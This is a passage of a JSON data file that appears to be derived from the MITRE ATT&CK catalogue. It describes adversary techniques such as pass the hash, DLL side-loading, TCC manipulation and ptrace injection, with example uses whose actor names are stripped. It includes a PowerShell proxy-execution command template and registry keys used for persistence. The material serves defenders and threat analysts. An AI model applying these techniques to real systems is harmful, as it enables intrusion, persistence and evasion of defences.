  },
  "attack-pattern--e5d550f3-2202-4634-85f2-4a200a1d49b3": {
    "name": "SEO Poisoning",
    "example_uses": [
      "has poisoned search engine results to return fake software updates in order to distribute malware."
    ],
    "description": "Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the sites ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)To help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)In addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towards [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) lures. In-site searches will rank search results according to their own algorithms and metrics such as popularity(Citation: Chexmarx-seo) which may be targeted and gamed by malicious actors.(Citation: Checkmarx-oss-seo)Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the sites calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)",
    "similar_words": [
      "SEO Poisoning"
    ],
    "id": "T1608.006"
  },
  "attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e": {
    "name": "Pass the Hash",
    "example_uses": [
      "has used pass the hash for lateral movement.",
      "can perform pass the hash.",
      "can perform pass the hash.",
      "has used pass the hash for lateral movement.",
      "has dumped password hashes for use in pass the hash authentication attacks.",
      "The  group is known to have used pass the hash.",
      "has used the `Invoke-SMBExec` PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally.",
      "has been observed loading several APIs associated with Pass the Hash.",
      "has a number of modules that leverage pass the hash for lateral movement.",
      "SEKURLSA::Pth module can impersonate a user with only a password hash to execute arbitrary commands.",
      "uses tools such as  to enable lateral movement via captured password hashes.",
      "has used pass the hash for authentication to remote access software used in C2.",
      "can perform pass the hash attacks.",
      "has used the PowerShell utility `Invoke-SMBExec` to execute the pass the hash method for lateral movement within an compromised environment.",
      "can perform pass the hash on compromised machines with x64 versions.",
      "can pass the hash to authenticate via SMB.",
      "During  threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers.",
      "used dumped hashes to authenticate to other machines via pass the hash.",
      "used a registry edit to enable a Windows feature called RestrictedAdmin in victim environments. This change allowed  to leverage pass the hash mechanisms as the alteration allows for RDP connections with a valid account name and hash only without possessing a cleartext password value.",
      "has used pass-the-hash techniques for lateral movement in victim environments."
    ],
    "description": "Adversaries may pass the hash using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.Adversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",
    "similar_words": [
      "Pass the Hash"
    ],
    "id": "T1550.002"
  },
  "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b": {
    "name": "DLL Side-Loading",
    "example_uses": [
      "has used side loading to place malicious DLLs in memory.",
      "can use a digitally signed binary (Logitech Bluetooth Wizard Host Process) to load its dll into memory.",
      "maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware.",
      "has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe.",
      "can abuse legitimate Windows executables to side-load malicious DLL files.",
      "can use DLL side-loading to execute malicious payloads.",
      "A  .dll that contains  is loaded and executed using DLL side-loading.",
      "side loads a malicious file sspisrv.dll in part of a spoofed lssas.exe service.",
      "can use DLL side-loading to load malicious DLLs into legitimate executables.",
      "typically loads its DLL file into a legitimate signed Java or VMware executable.",
      "has used DLL side-loading including by using legitimate Kaspersky antivirus variants as well as `rc.exe` a legitimate Microsoft Resource Compiler.",
      "has used a legitimate application to sideload a DLL to decrypt decompress and run a payload.",
      "used DLL side-loading to covertly load  into memory on the victim machine.",
      "s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library.",
      "has side-loaded its malicious DLL file.",
      "has used DLL side loading to import and load a malicious DLL loader.",
      "has used DLL side-loading to evade anti-virus.",
      "has used DLL side-loading to load malicious payloads.",
      "ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate signed executable (AcroTranscoder).",
      "uses DLL side-loading typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.",
      "During the  installation process it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.",
      "A  variant has used DLL side-loading.",
      "DLL side-loading has been used to execute  through a legitimate Citrix executable ssonsvr.exe. The Citrix executable was dropped along with  by the dropper.",
      "loaders can be side-loaded with legitimate and signed executables including the VLC.exe media player.",
      "has used DLL side-loading.",
      "has the ability to use DLL side-loading for execution.",
      "has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.",
      "has placed a malicious payload in `%WINDIR%\\SYSTEM32\\oci.dll` so it would be sideloaded by the MSDTC service.",
      "can use DLL side-loading to load malicious DLLs.",
      "has used legitimate executables such as `winword.exe` and `igfxem.exe` to side-load their malware.",
      "has been executed as a file named DsNcDiag.dll through side-loading.",
      "has used legitimate applications to side-load malicious DLLs.",
      "has been known to side load DLLs with a valid version of Chrome with one of their tools.",
      "has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories.",
      "has used DLL side-loading to execute its payload.",
      "has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507).",
      "has used a legitimately signed executable to execute a malicious payload within a DLL file.",
      "used legitimate executables to perform DLL side-loading of their malware.",
      "can use DLL side-loading to gain execution.",
      "has used a malicious loader DLL file to execute the `credwiz.exe` process and side-load the malicious payload `Duser.dll`.",
      "can side-load `Goopdate.dll` into `GoogleUpdate.exe`.",
      "can support an HKCMD sideloading start method.",
      "includes one infection vector that leverages a malicious KeyScramblerE.DLL library that will load during the execution of the legitimate KeyScrambler application.",
      "uses DLL side-loading to load malicious programs.",
      "can load DLLs through vulnerable legitimate executables.",
      "has the ability to side-load malicious DLLs with legitimate applications from Kaspersky Microsoft and Google.",
      "can abuse the legitimate application policytool.exe to load a malicious DLL.",
      "has been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading.",
      "has used DLL side-loading to load malicious DLL's into legitimate executables.",
      "has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as .",
      "has replaced `win_fw.dll` an internal component that is executed during IDA Pro installation with a malicious DLL to download and execute a payload.",
      "During  the threat actors used the legitimate Windows services `IKEEXT` and `PrintNotify` to side-load malicious DLLs.",
      "exploits a security vulnerability to load a fake DLL and execute its code.",
      "has abused legitimate executables to side-load weaponized DLLs.",
      "can use side-loading to run malicious executables.",
      "can store a file named `mpsvc.dll` which opens a malicious `mpsvc.mui` file in the same folder as the legitimate Microsoft executable `MsMpEng.exe` to gain execution.",
      "can be installed via DLL side-loading.",
      "launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.",
      "side loads its communications module as a DLL into the libcurl.dll loader.",
      "has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.",
      "can use legitimate signed EXE files paired with malicious DLL files to load and run malicious payloads while bypassing defenses.",
      "has used legitimate software to side-load  loaders onto victim systems.  is also linked to multiple other instances of side-loading for initial loading activity.",
      "used DLL side-loading to execute  via an AhnLab uninstaller."
    ],
    "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
    "similar_words": [
      "DLL Side-Loading"
    ],
    "id": "T1574.002"
  },
  "attack-pattern--e6f19759-dde3-47fc-99cc-d9f5fa4ade60": {
    "name": "SyncAppvPublishingServer",
    "example_uses": [],
    "description": "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)    The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by \"living off the land.\"(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)For example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv)`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`",
    "similar_words": [
      "SyncAppvPublishingServer"
    ],
    "id": "T1216.002"
  },
  "attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306": {
    "name": "Additional Email Delegate Permissions",
    "example_uses": [
      "During the   added their own devices as allowed IDs for active sync using `Set-CASMailbox` allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.",
      "granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations.",
      "has used a Powershell cmdlet to grant the ApplicationImpersonation role to a compromised account.",
      "has used a compromised global administrator account in Azure AD to backdoor a service principal with `ApplicationImpersonation` rights to start collecting emails from targeted mailboxes;  has also used compromised accounts holding `ApplicationImpersonation` rights in Exchange to collect emails.",
      "During  threat actors added the `ApplicationImpersonation` management role to accounts under their control to impersonate users and take ownership of targeted mailboxes."
    ],
    "description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. For example, the Add-MailboxPermission [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target users mail folders.(Citation: Mandiant Defend UNC2452 White Paper)This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)",
    "similar_words": [
      "Additional Email Delegate Permissions"
    ],
    "id": "T1098.002"
  },
  "attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15": {
    "name": "Code Signing Certificates",
    "example_uses": [
      "has obtained code signing certificates signed by DigiCert GlobalSign and COMOOD for malware payloads.",
      "has used stolen code-signing certificates for its malicious payloads.",
      "has stolen legitimate certificates to sign malicious payloads.",
      "has used an expired open-source X.509 certificate for testing in the OpenSSL repository to connect to actor-controlled C2 servers.",
      "has used code signing certificates issued to fake companies to bypass security controls.",
      "During   used code signing certificates issued by Sectigo RSA for some of its malware and tools.",
      "has obtained stolen valid certificates including from VMProtect and the Chinese instant messaging application Youdu for their operations.",
      "During  threat actors used tools with legitimate code signing certificates.",
      "used stolen code signing certificates to sign  malware and components.",
      "has obtained stolen code signing certificates to digitally sign malware.",
      "has stolen a valid certificate that is used to sign the malware and the dropper."
    ],
    "description": "Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",
    "similar_words": [
      "Code Signing Certificates"
    ],
    "id": "T1588.003"
  },
  "attack-pattern--e848506b-8484-4410-8017-3d235a52f5b3": {
    "name": "Serverless Execution",
    "example_uses": [
      "can create malicious Lambda functions."
    ],
    "description": "Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation: Cado Security Denonia) Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to a serverless cloud function, which may then be able to perform actions the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation)Serverless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.(Citation: Backdooring an AWS account) This is also possible in many cloud-based office application suites. For example, in Microsoft 365 environments, an adversary may create a Power Automate workflow that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001) In Google Workspace environments, they may instead create an Apps Script that exfiltrates a user's data when they open a file.(Citation: Cloud Hack Tricks GWS Apps Script)(Citation: OWN-CERT Google App Script 2024)",
    "similar_words": [
      "Serverless Execution"
    ],
    "id": "T1648"
  },
  "attack-pattern--e8a0a025-3601-4755-abfb-8d08283329fb": {
    "name": "TCC Manipulation",
    "example_uses": [
      "For several modules  attempts to access or list the contents of user folders such as Desktop Downloads and Documents. If the folder does not exist or access is denied it enters a loop where it resets the TCC database and retries access."
    ],
    "description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)Adversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055) or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)",
    "similar_words": [
      "TCC Manipulation"
    ],
    "id": "T1548.006"
  },
  "attack-pattern--ea016b56-ae0e-47fe-967a-cc0ad51af67f": {
    "name": "Ptrace System Calls",
    "example_uses": [
      "can use PTRACE to attach to a targeted process to read process memory."
    ],
    "description": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: malloc) then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute. Ptrace system call injection can also be done with PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Ptrace System Calls"
    ],
    "id": "T1055.008"
  },
  "attack-pattern--ea071aa0-8f17-416f-ab0d-2bab7e79003d": {
    "name": "Power Settings",
    "example_uses": [
      "involved exploitation of CVE-2024-20353 to force a victim Cisco ASA to reboot triggering the automated unzipping and execution of the  implant.",
      "used CVE-2024-20353 to trigger victim devices to reboot in the process unzipping and installing the  payload.",
      "can modify the crash dump process on infected machines to skip crash dump generation and proceed directly to device reboot for both persistence and forensic evasion purposes."
    ],
    "description": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.(Citation: Sleep, shut down, hibernate)Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.(Citation: Microsoft: Powercfg command-line options)(Citation: systemdsleep Linux)For example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.(Citation: Two New Monero Malware Attacks Target Windows and Android Users) Adversaries may also extend system lock screen timeout settings.(Citation: BATLOADER: The Evasive Downloader Malware) Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.(Citation: CoinLoader: A Sophisticated Malware Loader Campaign)Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.(Citation: Condi-Botnet-binaries)",
    "similar_words": [
      "Power Settings"
    ],
    "id": "T1653"
  },
  "attack-pattern--ea4c2f9c-9df1-477c-8c42-6da1118f2ac4": {
    "name": "Dynamic API Resolution",
    "example_uses": [
      "can hash then resolve API calls at runtime.",
      "has used obfuscated API calls that are retrieved by their checksums.",
      "has used a custom hashing method to resolve APIs used in shellcode.",
      "can use a dynamic Windows hashing algorithm to map API components.",
      "can call and dynamically resolve hashed APIs.",
      "can encrypt API name strings with an XOR-based algorithm.",
      "can resolve Windows APIs dynamically by hash.",
      "dynamically links key WinApi functions during execution.",
      "can use `LoadLibrary` and `GetProcAddress` to resolve Windows API function strings at run time."
    ],
    "description": "Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",
    "similar_words": [
      "Dynamic API Resolution"
    ],
    "id": "T1027.007"
  },
  "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf": {
    "name": "Remote Desktop Protocol",
    "example_uses": [
      "has used RDP for direct remote point-and-click access.",
      "can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.",
      "has a module for performing remote desktop access.",
      "has moved laterally throughout victim environments using RDP.",
      "has used RDP for lateral movement.",
      "has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.",
      "attempted to use RDP to move laterally.",
      "has used RDP for lateral movement.",
      "has a module for performing remote desktop access.",
      "has the ability to control an infected PC using RDP.",
      "has been seen using RDP for lateral movement and persistence in some cases employing the rdpwinst tool for mangement of multiple sessions.",
      "has used Remote Desktop Services to copy tools on targeted systems.",
      "has used RDP for lateral movement and to deploy ransomware interactively.",
      "enables concurrent Remote Desktop Protocol (RDP) sessions.",
      "During the   used RDP sessions from public-facing systems to internal servers.",
      "During  the threat actors opened a variety of ports to establish RDP connections including ports 28035 32467 41578 and 46892.",
      "During  threat actors used RDP with compromised credentials for lateral movement.",
      "has used RDP to move laterally in victim environments.",
      "During the  campaign  utilized RDP throughout an operation.",
      "has used RDP for lateral movement.",
      "has a plugin to perform RDP access.",
      "has commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel.",
      "has used remote desktop sessions for lateral movement.",
      "has used RDP during operations.",
      "has used Remote Desktop Protocol to conduct lateral movement.",
      "has the ability to use RDP to connect to victim's machines.",
      "can enable remote desktop on the victim's machine.",
      "can support RDP control.",
      "has a module for performing remote desktop access.",
      "has laterally moved using RDP connections.",
      "can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.",
      "can open an active screen of the victims machine and take control of the mouse and keyboard.",
      "used RDP to move laterally in victim networks.",
      "has used RDP to move laterally to systems in the victim environment.",
      "has remote desktop functionality.",
      "has remotely accessed compromised environments via Remote Desktop Services (RDS) for lateral movement.",
      "has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.",
      "has used RDP connections to move across the victim network.",
      "During  the threat actors used RDP to access specific network hosts of interest.",
      "malware SierraCharlie uses RDP for propagation.",
      "enables the Remote Desktop Protocol for persistence.  has also interacted with compromised systems to browse and copy files through RDP sessions.",
      "has used RDP to log in and move laterally in the target environment.",
      "has targeted RDP credentials and used it to move through the victim environment.",
      "has moved laterally via RDP.",
      "used RDP for lateral movement.",
      "has used RDP to access targeted systems.",
      "The  group is known to have used RDP during operations.",
      "has used RDP to move laterally.",
      "has moved laterally to the Domain Controller via RDP using a compromised account with domain administrator privileges.",
      "leveraged stolen credentials to move laterally via RDP in victim environments.",
      "During  threat actors primarily used RDP for lateral movement in the victim environment.",
      "tunnels RDP traffic through deployed web shells to access victim environments via compromised accounts.  used the Plink tool to tunnel RDP connections for remote access and lateral movement in victim environments.",
      "used RDP for lateral movement.  used NATBypass to expose local RDP ports on compromised systems to the Internet.",
      "has used RDP to access other hosts within victim networks.",
      "can be used to tunnel RDP connections.",
      "During   used RDP for lateral movement."
    ],
    "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)",
    "similar_words": [
      "Remote Desktop Protocol"
    ],
    "id": "T1021.001"
  },
  "attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3": {
    "name": "Logon Script (Windows)",
    "example_uses": [
      "An  loader Trojan adds the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.",
      "dispatcher can establish persistence via adding a Registry key with a logon script HKEY_CURRENT_USER\\Environment UserInitMprLogonScript .",
      "has registered a Windows shell script under the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.",
      "has the ability to set the HKCU\\Environment\\UserInitMprLogonScript Registry key to execute logon scripts.",
      "performs persistence with a logon script via adding to the Registry key HKCU\\Environment\\UserInitMprLogonScript.",
      "has added persistence by registering the file name for the next stage malware under HKCU\\Environment\\UserInitMprLogonScript."
    ],
    "description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the HKCU\\Environment\\UserInitMprLogonScript Registry key.(Citation: Hexacorn Logon Scripts)Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ",
    "similar_words": [
      "Logon Script (Windows)"
    ],
    "id": "T1037.001"
  },
  "attack-pattern--eb2cb5cb-ae87-4de0-8c35-da2a17aafb99": {
    "name": "ListPlanting",
    "example_uses": [
      "has used ListPlanting to inject code into a trusted process."
    ],
    "description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.(Citation: Hexacorn Listplanting) Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.List-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a SysListView32 control.ListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process memory space, which can be performed various ways including by directly obtaining a handle to the SysListView32 child of the victim process window (via Windows API calls such as FindWindow and/or EnumWindows) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function. For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) Finally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback.",
    "similar_words": [
      "ListPlanting"
    ],
    "id": "T1055.015"
  },
  "attack-pattern--eb897572-8979-4242-a089-56f294f4c91d": {
    "name": "Hide Infrastructure",
    "example_uses": [
      "During the   set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.",
      "command and control includes hard-coded domains in the malware masquerading as legitimate services such as Akamai CDN or Amazon Web Services.",
      "uses compromised residential endpoints typically within the same ISP IP address range as proxies to hide the true source of C2 traffic.",
      "has utilized an ORB (operational relay box) network  consisting compromised devices such as small office and home office (SOHO) routers IoT devices and leased virtual private servers (VPS)  to obfuscate the origin of C2 traffic.",
      "can use a chain of jump hosts to communicate with compromised devices to obscure actor infrastructure.",
      "attempts to retrieve a non-existent webpage from the command and control server resulting in hidden commands sent via resulting error messages."
    ],
